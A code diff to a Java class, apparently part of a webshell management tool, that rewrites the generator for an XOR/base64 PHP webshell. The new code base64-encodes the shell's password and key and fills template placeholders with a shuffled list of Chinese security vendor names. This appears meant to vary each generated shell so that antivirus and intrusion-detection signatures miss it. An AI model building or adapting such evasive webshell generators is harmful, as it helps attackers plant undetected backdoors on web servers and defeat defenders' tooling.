@@ -9,6 +9,11 @@ import core.annotation.CryptionAnnotation;
 import core.imp.Cryption;
 import core.shell.ShellEntity;
 import java.net.URLEncoder;
+import java.util.Arrays;
+import java.util.HashMap;
+import java.util.Map;
+import java.util.Random;
+
 import util.Log;
 import util.functions;
 import util.http.Http;
@@ -26,6 +31,8 @@ public class PhpXormessage implements Cryption {
     private byte[] payload;
     private String findStrLeft;
     private String findStrRight;
+    private String changshangyi;
+    //private String changshangyi = "aaaaa";
 
     public PhpXormessage() {
     }
@@ -84,6 +91,11 @@ public class PhpXormessage implements Cryption {
         return true;
     }
 
+//    @Override
+//    public byte[] generate(String s, String s1) {
+//        return new byte[0];
+//    }
+
     public byte[] E(byte[] cs) {
         int len = cs.length;
 
@@ -114,7 +126,62 @@ public class PhpXormessage implements Cryption {
         return this.state;
     }
 
+//    public byte[] generate(String password, String secretKey) {
+//        return (new String(functions.readInputStreamAutoClose(PhpXormessage.class.getResourceAsStream("template/xorbase64message.bin")))).replace("{pass}", functions.base64EncodeToString(password.getBytes())).replace("{secretKey}", functions.base64EncodeToString(functions.md5(secretKey).substring(0, 16).getBytes())).getBytes();
+//    }
+
+
+//    public byte[] generate(String password, String secretKey) {
+//        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), false);
+//    }
+//    private static Random rand = new Random();
+//    public static <T> void swap(T[] a, int i, int j) {
+//        T temp = a[i];
+//        a[i] = a[j];
+//        a[j] = temp;
+//    }
+//
+//    public static <T> void shuffle(T[] arr) {
+//        int length = arr.length;
+//        for (int i = length; i > 0; i--) {
+//            int randInd = rand.nextInt(i);
+//            swap(arr, randInd, i - 1);
+//        }
+//    }
+
+
     public byte[] generate(String password, String secretKey) {
-        return (new String(functions.readInputStreamAutoClose(PhpXormessage.class.getResourceAsStream("template/xorbase64message.bin")))).replace("{pass}", password).replace("{secretKey}", functions.md5(secretKey).substring(0, 16)).getBytes();
+        String[] arr = { "qianxin", "nsfocus", "sangfor", "dbappsecurity", "chaitin", "damddos", "alibaba", "baidu" ,"leadsec",
+                "venustech","asiainfosec","qingteng","threatbook","antiy","dptech","hillstonenet","topsec","huawei"};
+        shuffle(arr);
+        return (new String(functions.readInputStreamAutoClose(PhpXormessage.class.getResourceAsStream("template/xorbase64message.bin"))))
+                .replace("{pass}", functions.base64EncodeToString(password.getBytes()))
+                .replace("{secretKey}", functions.base64EncodeToString(functions.md5(secretKey).substring(0, 16).getBytes()))
+                .replace("{stryi}", arr[0]).replace("{strer}", arr[1])
+                .replace("{strsan}", arr[2]).replace("{strsi}", arr[3])
+                .replace("{strwu}", arr[4]).replace("{strliu}", arr[5])
+                .replace("{strqi}", arr[6]).replace("{strba}", arr[7])
+                .replace("{strjiu}", arr[8]).replace("{strshi}", arr[9])
+                .replace("{strshiyi}", arr[10]).replace("{strshier}", arr[11])
+                .replace("{strshisan}", arr[12]).replace("{strshisi}", arr[13])
+                .replace("{strshiwu}", arr[14]).replace("{strshiliu}", arr[15])
+                .replace("{strshiqi}", arr[16]).replace("{strshiba}", arr[17])
+                .getBytes();
     }
+    private static Random rand = new Random();
+
+    public static <T> void swap(T[] a, int i, int j) {
+        T temp = a[i];
+        a[i] = a[j];
+        a[j] = temp;
+    }
+
+    public static <T> void shuffle(T[] arr) {
+        int length = arr.length;
+        for (int i = length; i > 0; i--) {
+            int randInd = rand.nextInt(i);
+            swap(arr, randInd, i - 1);
+        }
+        }
+
 }
